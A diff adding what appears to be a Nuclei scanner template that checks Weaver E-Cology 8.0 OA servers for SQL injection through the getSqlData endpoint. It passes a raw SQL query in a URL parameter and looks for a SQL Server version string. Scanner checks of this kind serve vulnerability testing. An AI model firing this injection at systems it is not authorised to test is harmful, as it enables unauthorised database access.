@@ -1,0 +1,23 @@
+id: poc-yaml-weaver-e-office-getSqlData-sqli
+info:
+  name: 泛微OA E-Cology 8.0 getSqlData SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - method: GET
+    path:
+      - "/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"api_status\":true"
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
